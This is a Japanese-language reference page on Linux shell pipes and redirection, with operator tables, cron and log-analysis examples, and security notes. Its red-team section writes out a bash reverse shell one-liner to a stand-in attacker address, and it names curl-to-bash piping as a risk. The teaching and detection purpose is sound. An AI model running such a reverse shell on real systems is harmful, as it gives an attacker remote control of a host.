# OS  - Linux - pipes_redirections - # パイプとリダイレクション - シェルの入出力を制御する

## 概要

パイプとリダイレクションは、Linux/Unixシェルの最も強力で基本的な機能です。これらを使いこなすことで、複数のコマンドを連携させたり、コマンドの実行結果をファイルに保存したりと、単純なコマンドを組み合わせて複雑なタスクを効率的に実行できます。

* **パイプ (`|`)**: あるコマンドの**出力**を、別のコマンドの**入力**に直接接続します。
* **リダイレクション (`>`, `<`)**: コマンドの**入力元**や**出力先**を、デフォルトのキーボードや画面から、**ファイル**などに切り替えます。

(出自: `bash`, `zsh` などのシェルの基本機能)

## 類似コマンドと差異

| 類似コマンド | 差異 / 使い分けのポイント | 推奨 |
| :--- | :--- |:---|
| **`xargs`** | パイプは標準入力を受け取るコマンドにしか繋げませんが、`xargs` は標準入力を**コマンドライン引数**に変換して、`rm` や `cp` のようなコマンドに渡すことができます。 | `xargs` (引数として渡す場合) |
| **`tee`** | リダイレクション (`>`) が出力をファイルのみに向けるのに対し、`tee` は出力を**ファイルに保存しつつ、後続のパイプにも渡す（画面にも表示する）**ことができます。 | `tee` (分岐させたい場合) |

## よく連携されるコマンド

パイプとリダイレクションは、特定のコマンドではなく、あらゆるコマンドと連携してその能力を拡張します。

### シナリオ例: ログ分析パイプライン (ブルーチーム視点)

* **目的**: 大量のログから不正ログインの兆候を抽出し、攻撃元IPを回数順にランキングする。
* **連携コマンド**: `journalctl`, `grep`, `awk`, `sort`, `uniq`
* **解説**: 複数のコマンドをパイプで数珠つなぎにして、データを流れ作業のように処理します。
* **コマンド例**:

```bash
# このパイプラインで、SSHのログイン失敗ログから攻撃元IPトップ10を抽出する
journalctl -u sshd | grep "Failed password" | awk '{print $(NF-3)}' | sort | uniq -c | sort -nr | head -n 10
```

## オプション説明 (演算子)

### ファイルディスクリプタ

* **`0` (標準入力, stdin)**: コマンドの入力元 (デフォルト: キーボード)
* **`1` (標準出力, stdout)**: コマンドの正常な結果の出力先 (デフォルト: 画面)
* **`2` (標準エラー出力, stderr)**: エラーメッセージの出力先 (デフォルト: 画面)

### 主要な演算子

| オプション | 説明 |
| :--- | :--- |
| **パイプ** | |
| ⭐ `\|` | **パイプ**。左のコマンドの `stdout` を、右のコマンドの `stdin` に接続します。 |
| **リダイレクション** | |
| ⭐ `>` | `stdout` をファイルに**上書き**します。 |
| ⭐ `>>` | `stdout` をファイルの**末尾に追記**します。 |
| `<` | ファイルを `stdin` としてコマンドに渡します。 |
| ⭐ `2>` | `stderr` をファイルに**上書き**します。 |
| ⭐ `&>` <br> `2>&1` | `stdout` と `stderr` の**両方**を同じ宛先にリダイレクトします。`cmd > file 2>&1` は古典的な書き方です。 |
| `<<` | **ヒアドキュメント**。スクリプト内に記述した複数行のテキストを `stdin` として渡します。 |

## よく使われるオプション組み合わせと業務シナリオ

### 1. インフラ構築・運用視点

* **タスク**: cronジョブで実行するスクリプトの全出力を、ログファイルに追記する。
* **組み合わせ**: `>> <logfile> 2>&1`
* **解説**: スクリプトの正常な出力 (`stdout`) とエラー出力 (`stderr`) の両方を、同じログファイルに追記します。これにより、cronジョブの実行結果を、成功・失敗にかかわらず全て記録できます。
* **例**:

```bash
# crontabの記述例
0 2 * * * /usr/local/bin/backup.sh >> /var/log/backup.log 2>&1
```

### 2. ブルーチーム視点

* **タスク**: 全てのカーネルメッセージからエラーだけを抽出し、ファイルに保存する。
* **組み合わせ**: `dmesg 2> /dev/null | grep -i error > kernel_errors.log`
* **解説**: `dmesg` の正常出力とエラー出力のうち、エラー出力だけを `/dev/null` に捨て、正常出力の中から `error` を含む行をファイルに保存します (※ `dmesg` は通常 `stdout` に両方出すため、この例は概念的なものです)。
* **例**:

```bash
# findコマンドの実行エラーだけを error.log に記録する
find / -name "*.conf" 2> error.log
```

### 3. レッドチーム視点

* **タスク**: 標的サーバー上で対話的なリバースシェルを確立する。
* **組み合わせ**: `>& /dev/tcp/<ip>/<port> 0>&1`
* **解説**: `bash` の全ての入出力 (`stdin`, `stdout`, `stderr`) を、攻撃者のマシンへのTCP接続にリダイレクトします。これにより、標的サーバーのシェルを乗っ取ります。
* **例**:

```bash
# bashの対話シェルを攻撃者のマシン (10.0.0.5:4444) に接続する
bash -i >& /dev/tcp/10.0.0.5/4444 0>&1
```

## セキュリティに関する考慮事項

### 脆弱性と悪用事例

* **脆弱性**: **コマンドインジェクション**。
* **悪用シナリオ**: `curl <URL> | bash` のように、信頼できないソースからの出力を直接シェルにパイプすることは、任意のコマンドを実行されてしまうため**極めて危険**です。

### GTFOBins / LOLBAS における利用例

パイプとリダイレクションは、GTFOBinsにリストされている多くの攻撃手法を実現するための**接着剤**の役割を果たします。

* **機能**: **Reverse Shell**, **Fileless Execution**
* **解説**: レッドチームのシナリオで述べたように、リバースシェルの確立や、ディスクに痕跡を残さないペイロードの実行に不可欠です。

### 対応策・緩和策 (ブルーチーム視点)

* **Prevention (予防)**: シェルスクリプトを記述する際は、変数を必ずダブルクォートで囲む (`"$VAR"`) など、セキュアコーディングを実践する。
* **Detection (検知)**: `auditd` やEDRで、不審なパイプライン（例: `curl` から `bash` へのパイプ）や、`/dev/tcp` へのアクセスを監視する。

## 注意点・補足

* **`tee` コマンド**: 「出力をファイルに保存しつつ、後続のパイプにも渡したい（画面でも確認したい）」という場合には `tee` コマンドが便利です。
